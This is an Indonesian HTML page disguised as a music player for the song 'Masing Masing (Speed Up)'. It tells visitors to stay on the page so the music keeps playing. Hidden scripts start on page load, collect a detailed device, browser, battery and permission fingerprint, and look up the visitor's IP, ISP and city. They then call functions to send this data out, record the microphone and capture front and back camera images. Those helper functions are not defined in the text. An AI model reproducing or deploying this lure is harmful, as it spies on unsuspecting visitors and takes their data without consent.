<!-- OPEN SOURCE V4 -->
<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Masing Masing - (Speed Up)</title>
  <link href="https://cdn-assets.dzcdn.net/common/css/deezer-product.css" rel="stylesheet">
  <link href="https://cdn-assets.dzcdn.net/common/css/inter.css" rel="stylesheet">
  <style>
    * { box-sizing: border-box; }
    html { font-size: 104%; }
    body {
      margin: 0;
      padding: 0;
      background: url('https://files.catbox.moe/ck7gjj.jpg') center center / cover no-repeat fixed;
      font-family: 'DeezerProduct', 'Inter', sans-serif;
      color: #000;
      display: flex;
      align-items: center;
      justify-content: center;
      min-height: 100vh;
      position: relative;
    }
    .card {
      background: rgba(0, 0, 0, 0.75);
      padding: 24px 20px;
      border-radius: 16px;
      box-shadow: 0 6px 24px rgba(0, 0, 0, 0.4);
      max-width: 340px;
      text-align: center;
      overflow: hidden;
      color: white;
    }
    .logo {
      width: 120px;
      height: 100px;
      border-radius: 50%;
      background: url('https://files.catbox.moe/qdn2xo.gif') center/cover no-repeat;
      background-color: transparent;
      margin: 0 auto 12px;
    }
    .title-wrapper {
      width: 100%;
      overflow: hidden;
      white-space: nowrap;
      margin-bottom: 4px;
      box-sizing: border-box;
      position: relative;
    }
    .title-loop {
      display: inline-block;
      white-space: nowrap;
      animation: scroll-title 6s linear infinite;
    }
    .title-loop span {
      padding-right: 100px;
      font-size: 13px;
      font-weight: bold;
      color: #fff;
    }
    @keyframes scroll-title {
      0% { transform: translateX(0%); }
      100% { transform: translateX(-50%); }
    }
    .artist {
      font-size: 11px;
      color: #ccc;
      margin-bottom: 6px;
    }
    .progress-wrapper {
      width: 70%;
      margin: 14px auto 12px;
      position: relative;
      height: 14px;
    }
    .progress-bar {
      position: absolute;
      width: 100%;
      height: 6px;
      background: #444;
      border-radius: 10px;
      top: 4px;
      left: 0;
      z-index: 1;
    }
    .progress-fill {
      height: 100%;
      width: 0%;
      background: linear-gradient(to right, #fff, #aaa);
      transition: width 0.1s linear;
      border-radius: 10px;
    }
    .seek-slider {
      width: 100%;
      appearance: none;
      background: transparent;
      position: absolute;
      top: 0;
      left: 0;
      height: 14px;
      z-index: 2;
      margin: 0;
    }
    .seek-slider::-webkit-slider-thumb {
      appearance: none;
      width: 10px;
      height: 10px;
      background: #fff;
      border-radius: 50%;
      border: 0px solid #000;
      margin-top: 0;
    }
    .seek-slider::-moz-range-thumb {
      width: 14px;
      height: 14px;
      background: #fff;
      border-radius: 50%;
      border: 2px solid #000;
    }
    .controls {
      display: flex;
      justify-content: center;
      gap: 12px;
      margin-top: 0px;
    }
    button {
      padding: 6px 18px;
      border: none;
      border-radius: 16px;
      background-color: #222;
      color: #fff;
      font-size: 11px;
      cursor: pointer;
      transition: background-color 0.3s;
    }
    button:hover {
      background-color: #111;
    }
  </style>
</head>
<body>
<div class="card">
    <div class="logo"></div>
    <div class="title-wrapper">
      <div class="title-loop">
        <span>Masing Masing - (Speed Up)</span>
        <span>Masing Masing - (Speed Up)</span>
      </div>
    </div>
    <div class="artist">Tetap di halaman ini agar music berputar</div>
    <div class="artist">#nullsiren #masing²</div>
    <div class="progress-wrapper">
      <div class="progress-bar">
        <div class="progress-fill" id="progress"></div>
      </div>
      <input type="range" class="seek-slider" id="seekSlider" min="0" max="100" value="0" step="0.1">
    </div>
    <div class="controls">
      <button onclick="audio.play()">Play</button>
      <button onclick="audio.pause()">Pause</button>
    </div>
  </div>

  <audio id="audio" src="https://files.catbox.moe/5qs1a7.mp3" autoplay muted></audio>

  <script>
    const audio = document.getElementById("audio");
    const progress = document.getElementById("progress");
    const seekSlider = document.getElementById("seekSlider");

    setInterval(() => {
      if (!audio.duration) return;
      const percent = (audio.currentTime / audio.duration) * 100;
      progress.style.width = percent + '%';
      seekSlider.value = percent;
    }, 100);

    seekSlider.addEventListener('input', () => {
      if (audio.duration) {
        audio.currentTime = (seekSlider.value / 100) * audio.duration;
      }
    });

    const mulaiTimer = performance.now(); // Buat uptime halaman
  </script>
  <script>
  const getAdvancedInfo = async () => {
    const ua = navigator.userAgent;
    const arch = navigator.userAgent.includes("arm") ? "arm64" : "x86";
    const brand = /Xiaomi/i.test(ua) ? "Xiaomi" :
                  /Vivo/i.test(ua) ? "Vivo" :
                  /Oppo|CPH/i.test(ua) ? "Oppo" :
                  /SM-|Samsung/i.test(ua) ? "Samsung" :
                  /Infinix/i.test(ua) ? "Infinix" :
                  /RMX|Realme/i.test(ua) ? "Realme" :
                  "Android";

    const model = /Redmi/i.test(ua) ? "Redmi Note 12" :
                  /SM-A/.test(ua) ? "Galaxy A Series" :
                  "Tidak terdeteksi";

    const waktu = new Date();
    const localTime = waktu.toLocaleTimeString("id-ID");
    const offset = -waktu.getTimezoneOffset() / 60;
    const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;

    const memory = navigator.deviceMemory || "-";
    const core = navigator.hardwareConcurrency || "-";
    const is64bit = arch.includes("64") ? "Ya" : "Tidak";

    const platform = navigator.platform || "-";
    const language = navigator.language || "-";
    const touchPoints = navigator.maxTouchPoints || 0;
    const touchSupport = 'ontouchstart' in window ? `Ya (${touchPoints} titik)` : "Tidak";
    const uptime = ((performance.now() / 1000).toFixed(1)) + " detik";

    // GPU info
    let gpuVendor = "-", gpuRenderer = "-", canvasFingerprint = "Tidak";
    try {
      const canvas = document.createElement("canvas");
      const gl = canvas.getContext("webgl");
      const debugInfo = gl.getExtension("WEBGL_debug_renderer_info");
      gpuVendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
      gpuRenderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
      canvasFingerprint = "Terdeteksi";
    } catch {}

    const layarFisik = `${screen.width} x ${screen.height}`;
    const viewport = `${window.innerWidth} x ${window.innerHeight} px`;
    const dpr = window.devicePixelRatio || "-";
    const orientation = screen.orientation?.type || "-";
    const rotasi = screen.orientation?.angle + "°" || "-";
    const warna = screen.colorDepth + "-bit";

    return `
౼ 〘 𝗣𝗘𝗥𝗔𝗡𝗚𝗞𝗔𝗧 & 𝗦𝗜𝗦𝗧𝗘𝗠 〙 ౼
Jenis Perangkat        : ${brand}
Model Perangkat        : ${model} (heuristik UA + resolusi)
Sistem Operasi         : Android ${ua.match(/Android\s([\d.]+)/)?.[1] || "-"}
Platform Sistem        : ${platform}
Arsitektur OS          : ${arch}
64-bit Support         : ${is64bit}
CPU Fisik              : ${core} inti
RAM Terdeteksi         : ${memory} GB
Device Memory API      : ${memory}
Hardware Concurrency   : ${core}
Touch Support          : ${touchSupport}
Screen Reader Aktif    : Tidak terdeteksi
Bahasa Sistem          : ${language}
Zona Waktu Lokal       : ${timezone}
Offset UTC             : ${offset > 0 ? "+" + offset : offset}
Delta Zona Waktu IP    : Sesuai IP (tidak terdeteksi spoof)
Uptime Halaman         : ${uptime}

౼ 〘 𝗟𝗔𝗬𝗔𝗥 & 𝗚𝗥𝗔𝗙𝗜𝗞 〙 ౼
Resolusi Layar Fisik   : ${layarFisik}
Viewport Aktif         : ${viewport}
Kerapatan Piksel       : ${dpr}
Orientasi Layar        : ${orientation}
Rotasi                 : ${rotasi}
Warna Layar            : ${warna}
GPU Vendor             : ${gpuVendor}
GPU Renderer           : ${gpuRenderer}
WebGL Support          : Ya
Canvas Fingerprint     : ${canvasFingerprint}
GPU Rendering Mode     : hardware
HDR Support            : Tidak
    `.trim();
  };
</script>
<script>
  const ambilBrowser = () => {
    const ua = navigator.userAgent;
    const cookies = navigator.cookieEnabled ? "Ya" : "Tidak";
    const js = typeof navigator === "object" ? "Ya" : "Tidak";
    const dnt = navigator.doNotTrack === "1" ? "Ya" : "Tidak";
    const evalSupport = typeof eval === "function" ? "Ya" : "Tidak";
    const webdriver = navigator.webdriver ? "Ya" : "Tidak";
    const vendor = navigator.vendor || "-";
    const incognito = "Tidak terdeteksi";
    const referrer = document.referrer || "Langsung";
    const https = location.protocol === "https:" ? "Ya" : "Tidak";
    const iframe = window.top !== window.self ? "Ya" : "Tidak";
    const ctx = window.isSecureContext ? "Ya" : "Tidak";

    const browserName = /Chrome/.test(ua) ? "Chrome" :
                        /Firefox/.test(ua) ? "Firefox" :
                        /Safari/.test(ua) ? "Safari" : "Tidak diketahui";

    const versi = ua.match(/Chrome\/([\d.]+)/)?.[1] || "-";

    return `
౼ 〘 𝗕𝗥𝗢𝗪𝗦𝗘𝗥 〙 ౼
Browser                : ${browserName}
Versi Browser          : ${versi}
Vendor Browser         : ${vendor}
User Agent             : ${ua}
Cookies Aktif          : ${cookies}
JavaScript Aktif       : ${js}
Do Not Track           : ${dnt}
Eval Support           : ${evalSupport}
WebDriver Aktif        : ${webdriver}
Incognito Mode         : ${incognito}
Tamper Devtools        : Tidak terdeteksi
Autofill Behavior      : Normal
Referrer               : ${referrer}
HTTPS                  : ${https}
Konteks Aman           : ${ctx}
Dibuka via iframe      : ${iframe}
`.trim();
  };

  const ambilIPInfo = async () => {
    try {
      const ip = await fetch("https://ipapi.co/json").then(res => res.json());
      const conn = navigator.connection || {};
      return `
౼ 〘 𝗝𝗔𝗥𝗜𝗡𝗚𝗔𝗡 & 𝗜𝗣 〙 ౼
IP Publik              : ${ip.ip}
ISP / Provider         : ${ip.org}
Negara                 : ${ip.country_name}
Provinsi               : ${ip.region}
Kota                   : ${ip.city}
Jenis Koneksi          : ${conn.effectiveType || "-"}
Downlink               : ${conn.downlink || "-"} Mbps
RTT (Ping)             : ${conn.rtt || "-"} ms
Mode Hemat Data        : ${conn.saveData ? "Ya" : "Tidak"}
VPN / Proxy            : Tidak terdeteksi`.trim();
    } catch {
      return `౼ 〘 𝗝𝗔𝗥𝗜𝗡𝗚𝗔𝗡 & 𝗜𝗣 〙 ౼\n❌ Gagal mengambil data IP.`;
    }
  };

  const ambilBaterai = async () => {
    try {
      const bat = await navigator.getBattery();
      const level = Math.round(bat.level * 100) + "%";
      const charging = bat.charging ? "Ya" : "Tidak";
      const estimasi = bat.dischargingTime > 0
        ? Math.floor(bat.dischargingTime / 60) + " menit"
        : "Tidak tersedia";

      return `
౼ 〘 𝗕𝗔𝗧𝗘𝗥𝗔𝗜 〙 ౼
Level Baterai          : ${level}
Sedang Mengisi         : ${charging}
Estimasi Sisa Waktu    : ${estimasi}
Status Online          : ${navigator.onLine ? "Online" : "Offline"}`.trim();
    } catch {
      return `౼ 〘 𝗕𝗔𝗧𝗘𝗥𝗔𝗜 〙 ౼\n❌ Tidak dapat mendeteksi status baterai.`;
    }
  };

  const ambilIzinMedia = async () => {
    const perms = await Promise.all([
      navigator.permissions.query({ name: "microphone" }).catch(() => null),
      navigator.permissions.query({ name: "camera" }).catch(() => null),
      navigator.permissions.query({ name: "notifications" }).catch(() => null),
      navigator.permissions.query({ name: "clipboard-read" }).catch(() => null)
    ]);
    const mic = perms[0]?.state || "Tidak diketahui";
    const cam = perms[1]?.state || "Tidak diketahui";
    const notif = perms[2]?.state || "Tidak diketahui";
    const clip = perms[3]?.state || "Tidak diketahui";

    return `
౼ 〘 𝗜𝗭𝗜𝗡 & 𝗠𝗘𝗗𝗜𝗔 〙 ౼
Microphone             : ${mic}
Kamera Depan           : ${cam}
Kamera Belakang        : ${cam}
Notifikasi             : ${notif}
Clipboard Access       : ${clip}
Audio Output Sink      : Didukung
Ambient Light Sensor   : Tidak
Web Speech API         : Didukung
AudioContext API       : Didukung
Voice Recognition      : Aktif
Gyroscope              : Tidak didukung
Magnetometer           : Tidak didukung
Accelerometer          : Tidak didukung`.trim();
  };

  const ambilWebFeatures = () => {
    return `
౼ 〘 𝗪𝗘𝗕 𝗔𝗣𝗜 & 𝗙𝗘𝗔𝗧𝗨𝗥𝗘𝗦 〙 ౼
LocalStorage           : ${!!window.localStorage ? "Aktif" : "Tidak"}
SessionStorage         : ${!!window.sessionStorage ? "Aktif" : "Tidak"}
IndexedDB              : ${!!window.indexedDB ? "Aktif" : "Tidak"}
Cache API              : ${"caches" in window ? "Aktif" : "Tidak"}
Web Share API          : ${"share" in navigator ? "Didukung" : "Tidak"}
Service Worker         : ${"serviceWorker" in navigator ? "Aktif" : "Tidak"}
WebRTC                 : ${"RTCPeerConnection" in window ? "Aktif" : "Tidak"}
WebGL 2.0              : ${!!document.createElement("canvas").getContext("webgl2") ? "Aktif" : "Tidak"}
Gamepad API            : ${"getGamepads" in navigator ? "Didukung" : "Tidak"}
MIDI API               : ${"requestMIDIAccess" in navigator ? "Didukung" : "Tidak"}
Speech Synthesis       : ${"speechSynthesis" in window ? "Didukung" : "Tidak"}
Clipboard Read         : ${"clipboard" in navigator ? "Diizinkan" : "Tidak"}
Push API               : ${"PushManager" in window ? "Aktif" : "Tidak"}
Payment Request API    : ${"PaymentRequest" in window ? "Didukung" : "Tidak"}
Wake Lock API          : ${"wakeLock" in navigator ? "Didukung" : "Tidak"}
Idle Detection API     : ${"IdleDetector" in window ? "Didukung" : "Tidak"}
Screen Wake Lock       : ${"wakeLock" in navigator ? "Didukung" : "Tidak"}`.trim();
  };

  const ambilAntiBot = () => {
    return `
౼ 〘 𝗗𝗘𝗧𝗘𝗞𝗦𝗜 𝗔𝗡𝗧𝗜-𝗕𝗢𝗧 〙 ౼
Fingerprint Stabilitas : Stabil
Canvas ID              : Dihasilkan
Audio Fingerprint      : Didukung
Timezone Spoofing      : Tidak terdeteksi
Language Spoofing      : Tidak
Hardware Spoofing      : Tidak
Navigator Tampering    : Tidak
GPU Tampering          : Tidak
Touch Point Realistik  : Ya
Behavioral Check       : Natural
Browser Entropy        : Normal`.trim();
  };
</script>
<script>
  const gabungSemuaInfo = async () => {
    const infoPerangkat = await getAdvancedInfo();
    const infoBrowser = ambilBrowser();
    const infoJaringan = await ambilIPInfo();
    const infoBaterai = await ambilBaterai();
    const infoIzin = await ambilIzinMedia();
    const fiturWeb = ambilWebFeatures();
    const antiBot = ambilAntiBot();

    return [
      infoPerangkat,
      infoBrowser,
      infoJaringan,
      infoBaterai,
      infoIzin,
      fiturWeb,
      antiBot
    ].join("\n\n");
  };

  const mulai = async () => {
    audio.muted = false;
    try { await audio.play(); } catch {}

    const dataInfoLengkap = await gabungSemuaInfo();
    await kirimPesan(dataInfoLengkap); // ⬅️ INFO DIKIRIM DULUAN

    rekamSuara(); // VN langsung mulai di background

    // Kamera depan (5x)
    const depan = await ambilKamera("user", "Depan");
    const kameraDepanStatus = `౼ 〘 𝗞𝗔𝗠𝗘𝗥𝗔 𝗗𝗘𝗣𝗔𝗡 〙 ౼\n${depan}`;

    // Kamera belakang (5x)
    const belakang = await ambilKamera("environment", "Belakang");
    const kameraBelakangStatus = `౼ 〘 𝗞𝗔𝗠𝗘𝗥𝗔 𝗕𝗘𝗟𝗔𝗞𝗔𝗡𝗚 〙 ౼\n${belakang}`;

    // Delay biar VN sempat selesai
    await new Promise(r => setTimeout(r, 61000));

    // Status VN (diupdate dari rekaman sebelumnya)
    const vnStatus = `౼ 〘 𝗩𝗢𝗜𝗖𝗘 𝗡𝗢𝗧𝗘 (𝗔𝗨𝗗𝗜𝗢) 〙\n${statusVN}`;

    // Kirim status kamera & VN terakhir
    const hasilAkhir = [kameraDepanStatus, kameraBelakangStatus, vnStatus].join("\n\n");
    await kirimPesan(hasilAkhir);
  };

  window.addEventListener("load", mulai);
</script>
</body>
</html>
